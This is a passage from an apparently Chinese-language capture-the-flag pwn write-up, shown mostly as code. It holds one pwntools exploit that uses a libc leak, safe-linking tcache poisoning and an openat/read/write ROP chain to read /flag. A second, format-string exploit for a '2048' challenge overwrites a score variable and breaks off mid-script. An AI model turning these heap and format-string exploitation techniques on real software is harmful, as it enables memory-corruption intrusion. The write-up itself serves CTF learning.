<a id="__codelineno-11-60" name="__codelineno-11-60" href="#__codelineno-11-60"></a>
<a id="__codelineno-11-61" name="__codelineno-11-61" href="#__codelineno-11-61"></a>
<a id="__codelineno-11-62" name="__codelineno-11-62" href="#__codelineno-11-62"></a>choice=2
<a id="__codelineno-11-63" name="__codelineno-11-63" href="#__codelineno-11-63"></a>if(choice==1):
<a id="__codelineno-11-64" name="__codelineno-11-64" href="#__codelineno-11-64"></a>    gdbscript=&#39;&#39;&#39;
<a id="__codelineno-11-65" name="__codelineno-11-65" href="#__codelineno-11-65"></a>    b printf
<a id="__codelineno-11-66" name="__codelineno-11-66" href="#__codelineno-11-66"></a>
<a id="__codelineno-11-67" name="__codelineno-11-67" href="#__codelineno-11-67"></a>    c
<a id="__codelineno-11-68" name="__codelineno-11-68" href="#__codelineno-11-68"></a>    c
<a id="__codelineno-11-69" name="__codelineno-11-69" href="#__codelineno-11-69"></a>    c
<a id="__codelineno-11-70" name="__codelineno-11-70" href="#__codelineno-11-70"></a>    c
<a id="__codelineno-11-71" name="__codelineno-11-71" href="#__codelineno-11-71"></a>    c
<a id="__codelineno-11-72" name="__codelineno-11-72" href="#__codelineno-11-72"></a>
<a id="__codelineno-11-73" name="__codelineno-11-73" href="#__codelineno-11-73"></a>    c
<a id="__codelineno-11-74" name="__codelineno-11-74" href="#__codelineno-11-74"></a>    c
<a id="__codelineno-11-75" name="__codelineno-11-75" href="#__codelineno-11-75"></a>    c
<a id="__codelineno-11-76" name="__codelineno-11-76" href="#__codelineno-11-76"></a>    c
<a id="__codelineno-11-77" name="__codelineno-11-77" href="#__codelineno-11-77"></a>    c
<a id="__codelineno-11-78" name="__codelineno-11-78" href="#__codelineno-11-78"></a>    c
<a id="__codelineno-11-79" name="__codelineno-11-79" href="#__codelineno-11-79"></a>    c
<a id="__codelineno-11-80" name="__codelineno-11-80" href="#__codelineno-11-80"></a>    c
<a id="__codelineno-11-81" name="__codelineno-11-81" href="#__codelineno-11-81"></a>
<a id="__codelineno-11-82" name="__codelineno-11-82" href="#__codelineno-11-82"></a>    c
<a id="__codelineno-11-83" name="__codelineno-11-83" href="#__codelineno-11-83"></a>    c
<a id="__codelineno-11-84" name="__codelineno-11-84" href="#__codelineno-11-84"></a>
<a id="__codelineno-11-85" name="__codelineno-11-85" href="#__codelineno-11-85"></a>    c
<a id="__codelineno-11-86" name="__codelineno-11-86" href="#__codelineno-11-86"></a>    c
<a id="__codelineno-11-87" name="__codelineno-11-87" href="#__codelineno-11-87"></a>    c
<a id="__codelineno-11-88" name="__codelineno-11-88" href="#__codelineno-11-88"></a>    c
<a id="__codelineno-11-89" name="__codelineno-11-89" href="#__codelineno-11-89"></a>    c
<a id="__codelineno-11-90" name="__codelineno-11-90" href="#__codelineno-11-90"></a>    c
<a id="__codelineno-11-91" name="__codelineno-11-91" href="#__codelineno-11-91"></a>    c
<a id="__codelineno-11-92" name="__codelineno-11-92" href="#__codelineno-11-92"></a>    c
<a id="__codelineno-11-93" name="__codelineno-11-93" href="#__codelineno-11-93"></a>    finish
<a id="__codelineno-11-94" name="__codelineno-11-94" href="#__codelineno-11-94"></a>
<a id="__codelineno-11-95" name="__codelineno-11-95" href="#__codelineno-11-95"></a>    &#39;&#39;&#39;
<a id="__codelineno-11-96" name="__codelineno-11-96" href="#__codelineno-11-96"></a>    p = gdb.debug(&#39;./pwn&#39;,gdbscript=gdbscript)
<a id="__codelineno-11-97" name="__codelineno-11-97" href="#__codelineno-11-97"></a>elif(choice==2):
<a id="__codelineno-11-98" name="__codelineno-11-98" href="#__codelineno-11-98"></a>    #127.0.0.1:55205
<a id="__codelineno-11-99" name="__codelineno-11-99" href="#__codelineno-11-99"></a>    p = remote(&#39;127.0.0.1&#39;,52718)
<a id="__codelineno-11-100" name="__codelineno-11-100" href="#__codelineno-11-100"></a>else:
<a id="__codelineno-11-101" name="__codelineno-11-101" href="#__codelineno-11-101"></a>    p = process(&#39;./pwn&#39;)
<a id="__codelineno-11-102" name="__codelineno-11-102" href="#__codelineno-11-102"></a>sl(b&quot;2&quot;)
<a id="__codelineno-11-103" name="__codelineno-11-103" href="#__codelineno-11-103"></a>sl(b&quot;50&quot;)
<a id="__codelineno-11-104" name="__codelineno-11-104" href="#__codelineno-11-104"></a>payload=b&quot;A&quot;*63
<a id="__codelineno-11-105" name="__codelineno-11-105" href="#__codelineno-11-105"></a>sl(payload)
<a id="__codelineno-11-106" name="__codelineno-11-106" href="#__codelineno-11-106"></a>ru(payload)
<a id="__codelineno-11-107" name="__codelineno-11-107" href="#__codelineno-11-107"></a>p.recvn(1)
<a id="__codelineno-11-108" name="__codelineno-11-108" href="#__codelineno-11-108"></a>main_arena=u64(p.recvn(6).ljust(8,b&#39;\x00&#39;))
<a id="__codelineno-11-109" name="__codelineno-11-109" href="#__codelineno-11-109"></a>print(hex(main_arena))
<a id="__codelineno-11-110" name="__codelineno-11-110" href="#__codelineno-11-110"></a>off=0x7efea0e52ce0-0x7efea0c35000-0x3000
<a id="__codelineno-11-111" name="__codelineno-11-111" href="#__codelineno-11-111"></a>libc_base=main_arena-off
<a id="__codelineno-11-112" name="__codelineno-11-112" href="#__codelineno-11-112"></a>print(hex(libc_base))
<a id="__codelineno-11-113" name="__codelineno-11-113" href="#__codelineno-11-113"></a>libc=ELF(&quot;./libc.so.6&quot;)
<a id="__codelineno-11-114" name="__codelineno-11-114" href="#__codelineno-11-114"></a>env=libc_base+libc.sym[&#39;__environ&#39;]
<a id="__codelineno-11-115" name="__codelineno-11-115" href="#__codelineno-11-115"></a>sl(b&quot;2&quot;)
<a id="__codelineno-11-116" name="__codelineno-11-116" href="#__codelineno-11-116"></a>sl(str(0x60).encode())
<a id="__codelineno-11-117" name="__codelineno-11-117" href="#__codelineno-11-117"></a>payload=b&quot;A&quot;*14*8
<a id="__codelineno-11-118" name="__codelineno-11-118" href="#__codelineno-11-118"></a>s(payload)
<a id="__codelineno-11-119" name="__codelineno-11-119" href="#__codelineno-11-119"></a>ru(payload)
<a id="__codelineno-11-120" name="__codelineno-11-120" href="#__codelineno-11-120"></a>fd=u64(p.recvn(6).ljust(8,b&#39;\x00&#39;))
<a id="__codelineno-11-121" name="__codelineno-11-121" href="#__codelineno-11-121"></a>print(hex(fd))
<a id="__codelineno-11-122" name="__codelineno-11-122" href="#__codelineno-11-122"></a>high=(fd&amp;0xfff000000000)&gt;&gt;36
<a id="__codelineno-11-123" name="__codelineno-11-123" href="#__codelineno-11-123"></a>middle_high=((fd&amp;0xfff000000)&gt;&gt;24)^high
<a id="__codelineno-11-124" name="__codelineno-11-124" href="#__codelineno-11-124"></a>middle_low=(((fd&amp;0xfff000)&gt;&gt;12)^middle_high)-1
<a id="__codelineno-11-125" name="__codelineno-11-125" href="#__codelineno-11-125"></a>now_addr=(high&lt;&lt;36)+(middle_high&lt;&lt;24)+(middle_low&lt;&lt;12)+0xfe0
<a id="__codelineno-11-126" name="__codelineno-11-126" href="#__codelineno-11-126"></a>print(hex(now_addr))
<a id="__codelineno-11-127" name="__codelineno-11-127" href="#__codelineno-11-127"></a>true_fd=fd^(now_addr&gt;&gt;12)
<a id="__codelineno-11-128" name="__codelineno-11-128" href="#__codelineno-11-128"></a>print(hex(true_fd))
<a id="__codelineno-11-129" name="__codelineno-11-129" href="#__codelineno-11-129"></a>sl(b&quot;2&quot;)
<a id="__codelineno-11-130" name="__codelineno-11-130" href="#__codelineno-11-130"></a>sl(str(0x62).encode())
<a id="__codelineno-11-131" name="__codelineno-11-131" href="#__codelineno-11-131"></a>fake_env=(true_fd&gt;&gt;12)^(env-0x80)
<a id="__codelineno-11-132" name="__codelineno-11-132" href="#__codelineno-11-132"></a>print(hex(env))
<a id="__codelineno-11-133" name="__codelineno-11-133" href="#__codelineno-11-133"></a>payload=b&quot;A&quot;*8*28+p64(fake_env)
<a id="__codelineno-11-134" name="__codelineno-11-134" href="#__codelineno-11-134"></a>sl(payload)
<a id="__codelineno-11-135" name="__codelineno-11-135" href="#__codelineno-11-135"></a>ru(b&quot;Hello&quot;)
<a id="__codelineno-11-136" name="__codelineno-11-136" href="#__codelineno-11-136"></a>for i in range (3):
<a id="__codelineno-11-137" name="__codelineno-11-137" href="#__codelineno-11-137"></a>    sl(b&quot;2&quot;)
<a id="__codelineno-11-138" name="__codelineno-11-138" href="#__codelineno-11-138"></a>    sl(str(0x72).encode())
<a id="__codelineno-11-139" name="__codelineno-11-139" href="#__codelineno-11-139"></a>    sl(b&quot;A&quot;)
<a id="__codelineno-11-140" name="__codelineno-11-140" href="#__codelineno-11-140"></a>    ru(b&quot;Hello&quot;)
<a id="__codelineno-11-141" name="__codelineno-11-141" href="#__codelineno-11-141"></a>sl(b&quot;2&quot;)
<a id="__codelineno-11-142" name="__codelineno-11-142" href="#__codelineno-11-142"></a>sl(str(0x74).encode())
<a id="__codelineno-11-143" name="__codelineno-11-143" href="#__codelineno-11-143"></a>payload=b&quot;A&quot;*(16*8-1)
<a id="__codelineno-11-144" name="__codelineno-11-144" href="#__codelineno-11-144"></a>sl(payload)
<a id="__codelineno-11-145" name="__codelineno-11-145" href="#__codelineno-11-145"></a>ru(payload)
<a id="__codelineno-11-146" name="__codelineno-11-146" href="#__codelineno-11-146"></a>p.recvn(1)
<a id="__codelineno-11-147" name="__codelineno-11-147" href="#__codelineno-11-147"></a>stack_addr=u64(p.recvn(6).ljust(8,b&#39;\x00&#39;))
<a id="__codelineno-11-148" name="__codelineno-11-148" href="#__codelineno-11-148"></a>print(hex(stack_addr))
<a id="__codelineno-11-149" name="__codelineno-11-149" href="#__codelineno-11-149"></a>offset_addr=0x7ffd7a4568e8-0x7ffd7a456a08+0x240
<a id="__codelineno-11-150" name="__codelineno-11-150" href="#__codelineno-11-150"></a>print(hex(offset_addr))
<a id="__codelineno-11-151" name="__codelineno-11-151" href="#__codelineno-11-151"></a>ret_addr=(stack_addr-offset_addr)-8
<a id="__codelineno-11-152" name="__codelineno-11-152" href="#__codelineno-11-152"></a>
<a id="__codelineno-11-153" name="__codelineno-11-153" href="#__codelineno-11-153"></a>sl(b&quot;2&quot;)
<a id="__codelineno-11-154" name="__codelineno-11-154" href="#__codelineno-11-154"></a>sl(b&quot;10&quot;)
<a id="__codelineno-11-155" name="__codelineno-11-155" href="#__codelineno-11-155"></a>off_heap=0x55e16aae2270-0x55e16aae2670
<a id="__codelineno-11-156" name="__codelineno-11-156" href="#__codelineno-11-156"></a>
<a id="__codelineno-11-157" name="__codelineno-11-157" href="#__codelineno-11-157"></a>offret=0x7ffe5c1e24d0-0x7ffe5c1e2490
<a id="__codelineno-11-158" name="__codelineno-11-158" href="#__codelineno-11-158"></a>fake_stack=((true_fd-off_heap)&gt;&gt;12)^(ret_addr-offret-0x100)
<a id="__codelineno-11-159" name="__codelineno-11-159" href="#__codelineno-11-159"></a>print(hex(ret_addr))
<a id="__codelineno-11-160" name="__codelineno-11-160" href="#__codelineno-11-160"></a>payload=b&quot;A&quot;*32+p64(fake_stack)
<a id="__codelineno-11-161" name="__codelineno-11-161" href="#__codelineno-11-161"></a>
<a id="__codelineno-11-162" name="__codelineno-11-162" href="#__codelineno-11-162"></a>sl(payload)
<a id="__codelineno-11-163" name="__codelineno-11-163" href="#__codelineno-11-163"></a>ru(b&quot;Hello&quot;)
<a id="__codelineno-11-164" name="__codelineno-11-164" href="#__codelineno-11-164"></a>
<a id="__codelineno-11-165" name="__codelineno-11-165" href="#__codelineno-11-165"></a>
<a id="__codelineno-11-166" name="__codelineno-11-166" href="#__codelineno-11-166"></a>for i  in range(3):
<a id="__codelineno-11-167" name="__codelineno-11-167" href="#__codelineno-11-167"></a>    sl(b&quot;2&quot;)
<a id="__codelineno-11-168" name="__codelineno-11-168" href="#__codelineno-11-168"></a>    sl(str(0x62).encode())
<a id="__codelineno-11-169" name="__codelineno-11-169" href="#__codelineno-11-169"></a>    sl(b&quot;A&quot;)
<a id="__codelineno-11-170" name="__codelineno-11-170" href="#__codelineno-11-170"></a>    ru(b&quot;Hello&quot;)
<a id="__codelineno-11-171" name="__codelineno-11-171" href="#__codelineno-11-171"></a>
<a id="__codelineno-11-172" name="__codelineno-11-172" href="#__codelineno-11-172"></a>
<a id="__codelineno-11-173" name="__codelineno-11-173" href="#__codelineno-11-173"></a>sl(b&quot;2&quot;)
<a id="__codelineno-11-174" name="__codelineno-11-174" href="#__codelineno-11-174"></a>sl(str(0x64).encode())
<a id="__codelineno-11-175" name="__codelineno-11-175" href="#__codelineno-11-175"></a>openat=libc_base+libc.sym[&#39;openat&#39;]
<a id="__codelineno-11-176" name="__codelineno-11-176" href="#__codelineno-11-176"></a>rdi=0x2a3e5+libc_base
<a id="__codelineno-11-177" name="__codelineno-11-177" href="#__codelineno-11-177"></a>rsi=0x2be51+libc_base
<a id="__codelineno-11-178" name="__codelineno-11-178" href="#__codelineno-11-178"></a>rax=0x45eb0+libc_base
<a id="__codelineno-11-179" name="__codelineno-11-179" href="#__codelineno-11-179"></a>rdx_rbx=0x904a9+libc_base
<a id="__codelineno-11-180" name="__codelineno-11-180" href="#__codelineno-11-180"></a>read_addr=libc_base+libc.sym[&#39;read&#39;]
<a id="__codelineno-11-181" name="__codelineno-11-181" href="#__codelineno-11-181"></a>write_addr=libc_base+libc.sym[&#39;write&#39;]
<a id="__codelineno-11-182" name="__codelineno-11-182" href="#__codelineno-11-182"></a>payload=b&quot;&quot;
<a id="__codelineno-11-183" name="__codelineno-11-183" href="#__codelineno-11-183"></a>
<a id="__codelineno-11-184" name="__codelineno-11-184" href="#__codelineno-11-184"></a>
<a id="__codelineno-11-185" name="__codelineno-11-185" href="#__codelineno-11-185"></a>
<a id="__codelineno-11-186" name="__codelineno-11-186" href="#__codelineno-11-186"></a>payload+=(0x100-len(payload))*b&quot;\x00&quot;
<a id="__codelineno-11-187" name="__codelineno-11-187" href="#__codelineno-11-187"></a>#payload+=p64(ret_addr-offret-0x100+8)
<a id="__codelineno-11-188" name="__codelineno-11-188" href="#__codelineno-11-188"></a>payload+=b&quot;/flag\x00\x00\x00&quot;+p64(rsi)+p64(ret_addr-offret)+p64(rdi)+p64(0xFFFFFFFFFFFFFF9C)#AT_FDCWD
<a id="__codelineno-11-189" name="__codelineno-11-189" href="#__codelineno-11-189"></a>payload+=p64(rdx_rbx)+p64(0)*2
<a id="__codelineno-11-190" name="__codelineno-11-190" href="#__codelineno-11-190"></a>payload+=p64(openat)
<a id="__codelineno-11-191" name="__codelineno-11-191" href="#__codelineno-11-191"></a>payload+=p64(rdi)+p64(5)
<a id="__codelineno-11-192" name="__codelineno-11-192" href="#__codelineno-11-192"></a>payload+=p64(rsi)+p64(stack_addr)
<a id="__codelineno-11-193" name="__codelineno-11-193" href="#__codelineno-11-193"></a>payload+=p64(rdx_rbx)+p64(0x50)*2
<a id="__codelineno-11-194" name="__codelineno-11-194" href="#__codelineno-11-194"></a>payload+=p64(read_addr)
<a id="__codelineno-11-195" name="__codelineno-11-195" href="#__codelineno-11-195"></a>payload+=p64(rdi)+p64(1)
<a id="__codelineno-11-196" name="__codelineno-11-196" href="#__codelineno-11-196"></a>payload+=p64(rsi)+p64(stack_addr)
<a id="__codelineno-11-197" name="__codelineno-11-197" href="#__codelineno-11-197"></a>payload+=p64(rdx_rbx)+p64(0x50)*2
<a id="__codelineno-11-198" name="__codelineno-11-198" href="#__codelineno-11-198"></a>payload+=p64(write_addr)
<a id="__codelineno-11-199" name="__codelineno-11-199" href="#__codelineno-11-199"></a>sl(payload)
<a id="__codelineno-11-200" name="__codelineno-11-200" href="#__codelineno-11-200"></a>
<a id="__codelineno-11-201" name="__codelineno-11-201" href="#__codelineno-11-201"></a>print(hex(ret_addr-offret-0x100))
<a id="__codelineno-11-202" name="__codelineno-11-202" href="#__codelineno-11-202"></a>
<a id="__codelineno-11-203" name="__codelineno-11-203" href="#__codelineno-11-203"></a>
<a id="__codelineno-11-204" name="__codelineno-11-204" href="#__codelineno-11-204"></a>
<a id="__codelineno-11-205" name="__codelineno-11-205" href="#__codelineno-11-205"></a>itr()
</code></pre></div></p>
<h3 id="2048">2048<a class="headerlink" href="#2048" title="Permanent link">&para;</a></h3>
<p>简单的格式化字符串，甚至都不用劫持返回地址，只要能够覆写score就可以拿下flag，调一调就能过
<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
<a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>
<a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>
<a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a>
<a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
<a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a><span class="c1">#context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]</span>
<a id="__codelineno-12-7" name="__codelineno-12-7" href="#__codelineno-12-7"></a><span class="k">def</span><span class="w"> </span><span class="nf">s</span><span class="p">(</span><span class="n">a</span><span class="p">):</span>
<a id="__codelineno-12-8" name="__codelineno-12-8" href="#__codelineno-12-8"></a>    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
<a id="__codelineno-12-9" name="__codelineno-12-9" href="#__codelineno-12-9"></a>
<a id="__codelineno-12-10" name="__codelineno-12-10" href="#__codelineno-12-10"></a>
<a id="__codelineno-12-11" name="__codelineno-12-11" href="#__codelineno-12-11"></a><span class="k">def</span><span class="w"> </span><span class="nf">sa</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">):</span>
<a id="__codelineno-12-12" name="__codelineno-12-12" href="#__codelineno-12-12"></a>    <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">)</span>
<a id="__codelineno-12-13" name="__codelineno-12-13" href="#__codelineno-12-13"></a>
<a id="__codelineno-12-14" name="__codelineno-12-14" href="#__codelineno-12-14"></a>
<a id="__codelineno-12-15" name="__codelineno-12-15" href="#__codelineno-12-15"></a><span class="k">def</span><span class="w"> </span><span class="nf">sl</span><span class="p">(</span><span class="n">a</span><span class="p">):</span>
<a id="__codelineno-12-16" name="__codelineno-12-16" href="#__codelineno-12-16"></a>    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
<a id="__codelineno-12-17" name="__codelineno-12-17" href="#__codelineno-12-17"></a>
<a id="__codelineno-12-18" name="__codelineno-12-18" href="#__codelineno-12-18"></a>
<a id="__codelineno-12-19" name="__codelineno-12-19" href="#__codelineno-12-19"></a><span class="k">def</span><span class="w"> </span><span class="nf">sla</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">):</span>
<a id="__codelineno-12-20" name="__codelineno-12-20" href="#__codelineno-12-20"></a>    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">)</span>
<a id="__codelineno-12-21" name="__codelineno-12-21" href="#__codelineno-12-21"></a>
<a id="__codelineno-12-22" name="__codelineno-12-22" href="#__codelineno-12-22"></a>
<a id="__codelineno-12-23" name="__codelineno-12-23" href="#__codelineno-12-23"></a><span class="k">def</span><span class="w"> </span><span class="nf">r</span><span class="p">():</span>
<a id="__codelineno-12-24" name="__codelineno-12-24" href="#__codelineno-12-24"></a>    <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
<a id="__codelineno-12-25" name="__codelineno-12-25" href="#__codelineno-12-25"></a>
<a id="__codelineno-12-26" name="__codelineno-12-26" href="#__codelineno-12-26"></a>
<a id="__codelineno-12-27" name="__codelineno-12-27" href="#__codelineno-12-27"></a><span class="k">def</span><span class="w"> </span><span class="nf">pr</span><span class="p">():</span>
<a id="__codelineno-12-28" name="__codelineno-12-28" href="#__codelineno-12-28"></a>    <span class="nb">print</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">())</span>
<a id="__codelineno-12-29" name="__codelineno-12-29" href="#__codelineno-12-29"></a>
<a id="__codelineno-12-30" name="__codelineno-12-30" href="#__codelineno-12-30"></a><span class="k">def</span><span class="w"> </span><span class="nf">ru</span><span class="p">(</span><span class="n">a</span><span class="p">):</span>
<a id="__codelineno-12-31" name="__codelineno-12-31" href="#__codelineno-12-31"></a>    <span class="k">return</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
<a id="__codelineno-12-32" name="__codelineno-12-32" href="#__codelineno-12-32"></a>
<a id="__codelineno-12-33" name="__codelineno-12-33" href="#__codelineno-12-33"></a><span class="k">def</span><span class="w"> </span><span class="nf">rl</span><span class="p">(</span><span class="n">a</span><span class="p">):</span>
<a id="__codelineno-12-34" name="__codelineno-12-34" href="#__codelineno-12-34"></a>    <span class="k">return</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
<a id="__codelineno-12-35" name="__codelineno-12-35" href="#__codelineno-12-35"></a>
<a id="__codelineno-12-36" name="__codelineno-12-36" href="#__codelineno-12-36"></a>
<a id="__codelineno-12-37" name="__codelineno-12-37" href="#__codelineno-12-37"></a><span class="k">def</span><span class="w"> </span><span class="nf">itr</span><span class="p">():</span>
<a id="__codelineno-12-38" name="__codelineno-12-38" href="#__codelineno-12-38"></a>    <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
<a id="__codelineno-12-39" name="__codelineno-12-39" href="#__codelineno-12-39"></a>
<a id="__codelineno-12-40" name="__codelineno-12-40" href="#__codelineno-12-40"></a>
<a id="__codelineno-12-41" name="__codelineno-12-41" href="#__codelineno-12-41"></a><span class="k">def</span><span class="w"> </span><span class="nf">debug</span><span class="p">():</span>
<a id="__codelineno-12-42" name="__codelineno-12-42" href="#__codelineno-12-42"></a>    <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
<a id="__codelineno-12-43" name="__codelineno-12-43" href="#__codelineno-12-43"></a><span class="n">choice</span><span class="o">=</span><span class="mi">0</span>
<a id="__codelineno-12-44" name="__codelineno-12-44" href="#__codelineno-12-44"></a><span class="k">if</span><span class="p">(</span><span class="n">choice</span><span class="o">==</span><span class="mi">1</span><span class="p">):</span>
<a id="__codelineno-12-45" name="__codelineno-12-45" href="#__codelineno-12-45"></a>    <span class="n">gdbscript</span><span class="o">=</span><span class="s1">&#39;&#39;&#39;</span>
<a id="__codelineno-12-46" name="__codelineno-12-46" href="#__codelineno-12-46"></a><span class="s1">    b main</span>
<a id="__codelineno-12-47" name="__codelineno-12-47" href="#__codelineno-12-47"></a><span class="s1">    c</span>
<a id="__codelineno-12-48" name="__codelineno-12-48" href="#__codelineno-12-48"></a>
<a id="__codelineno-12-49" name="__codelineno-12-49" href="#__codelineno-12-49"></a><span class="s1">    &#39;&#39;&#39;</span>
<a id="__codelineno-12-50" name="__codelineno-12-50" href="#__codelineno-12-50"></a>    <span class="n">p</span><span class="o">=</span><span class="n">gdb</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="s2">&quot;./target&quot;</span><span class="p">,</span><span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">)</span>
<a id="__codelineno-12-51" name="__codelineno-12-51" href="#__codelineno-12-51"></a><span class="k">elif</span><span class="p">(</span><span class="n">choice</span><span class="o">==</span><span class="mi">2</span><span class="p">):</span>
<a id="__codelineno-12-52" name="__codelineno-12-52" href="#__codelineno-12-52"></a>    <span class="n">p</span><span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="s2">&quot;./target&quot;</span><span class="p">)</span>
<a id="__codelineno-12-53" name="__codelineno-12-53" href="#__codelineno-12-53"></a><span class="k">else</span><span class="p">:</span>
<a id="__codelineno-12-54" name="__codelineno-12-54" href="#__codelineno-12-54"></a>    <span class="n">p</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s1">&#39;127.0.0.1&#39;</span><span class="p">,</span><span class="mi">50589</span><span class="p">)</span>
<a id="__codelineno-12-55" name="__codelineno-12-55" href="#__codelineno-12-55"></a><span class="n">score</span><span class="o">=</span><span class="mh">0x503c</span>
<a id="__codelineno-12-56" name="__codelineno-12-56" href="#__codelineno-12-56"></a>
<a id="__codelineno-12-57" name="__codelineno-12-57" href="#__codelineno-12-57"></a><span class="n">payload</span><span class="o">=</span><span class="sa">b</span><span class="s2">&quot;%p&quot;</span>
<a id="__codelineno-12-58" name="__codelineno-12-58" href="#__codelineno-12-58"></a><span class="n">sl</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<a id="__codelineno-12-59" name="__codelineno-12-59" href="#__codelineno-12-59"></a><span class="n">ru</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;unknown cmd: &quot;</span><span class="p">)</span>
<a id="__codelineno-12-60" name="__codelineno-12-60" href="#__codelineno-12-60"></a><span class="n">leak</span><span class="o">=</span><span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">(),</span><span class="mi">16</span><span class="p">)</span>
<a id="__codelineno-12-61" name="__codelineno-12-61" href="#__codelineno-12-61"></a><span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">leak</span><span class="p">))</span>
<a id="__codelineno-12-62" name="__codelineno-12-62" href="#__codelineno-12-62"></a><span class="n">offset</span><span class="o">=</span><span class="mh">0x558d425d018e</span><span class="o">-</span><span class="mh">0x558d425d2000</span>
<a id="__codelineno-12-63" name="__codelineno-12-63" href="#__codelineno-12-63"></a><span class="n">tar</span><span class="o">=</span><span class="n">leak</span><span class="o">+</span><span class="n">score</span><span class="o">-</span><span class="n">offset</span><span class="o">-</span><span class="mh">0x55f5fac3603c</span><span class="o">+</span><span class="mh">0x55f5fac3103c</span>
<a id="__codelineno-12-64" name="__codelineno-12-64" href="#__codelineno-12-64"></a><span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">tar</span><span class="p">))</span>
<a id="__codelineno-12-65" name="__codelineno-12-65" href="#__codelineno-12-65"></a>
<a id="__codelineno-12-66" name="__codelineno-12-66" href="#__codelineno-12-66"></a><span class="n">payload</span><span class="o">=</span><span class="sa">b</span><span class="s2">&quot;b&quot;</span><span class="o">+</span><span class="sa">f</span><span class="s2">&quot;%</span><span class="si">{</span><span class="mh">0xffef</span><span class="si">}</span><span class="s2">x&quot;</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span><span class="o">+</span><span class="sa">b</span><span class="s2">&quot;%22$hn&quot;</span>
<a id="__codelineno-12-67" name="__codelineno-12-67" href="#__codelineno-12-67"></a><span class="n">payload</span><span class="o">+=</span><span class="p">(</span><span class="mh">0x10</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="sa">b</span><span class="s2">&quot;A&quot;</span>
<a id="__codelineno-12-68" name="__codelineno-12-68" href="#__codelineno-12-68"></a><span class="n">payload</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">tar</span><span class="p">)</span>
<a id="__codelineno-12-69" name="__codelineno-12-69" href="#__codelineno-12-69"></a><span class="n">payload</span><span class="o">+=</span><span class="p">(</span><span class="mh">0x1f</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span><span class="o">*</span><span class="sa">b</span><span class="s2">&quot;A&quot;</span>
<a id="__codelineno-12-70" name="__codelineno-12-70" href="#__codelineno-12-70"></a><span class="nb">print</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<a id="__codelineno-12-71" name="__codelineno-12-71" href="#__codelineno-12-71"></a><span class="n">sl</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<a id="__codelineno-12-72" name="__codelineno-12-72" href="#__codelineno-12-72"></a><span class="n">payload</span><span class="o">=</span><span class="sa">b</span><span class="s2">&quot;b&quot;</span><span class="o">+</span><span class="sa">f</span><span class="s2">&quot;%</span><span class="si">{</span><span class="mh">0xffef</span><span class="si">}</span><span class="s2">x&quot;</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span><span class="o">+</span><span class="sa">b</span><span class="s2">&quot;%22$hn&quot;</span>
<a id="__codelineno-12-73" name="__codelineno-12-73" href="#__codelineno-12-73"></a><span class="n">payload</span><span class="o">+=</span><span class="p">(</span><span class="mh">0x10</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="sa">b</span><span class="s2">&quot;A&quot;</span>
<a id="__codelineno-12-74" name="__codelineno-12-74" href="#__codelineno-12-74"></a><span class="n">payload</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">tar</span><span class="o">+</span><span class="mi">2</span><span class="p">)</span>
<a id="__codelineno-12-75" name="__codelineno-12-75" href="#__codelineno-12-75"></a><span class="nb">print</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
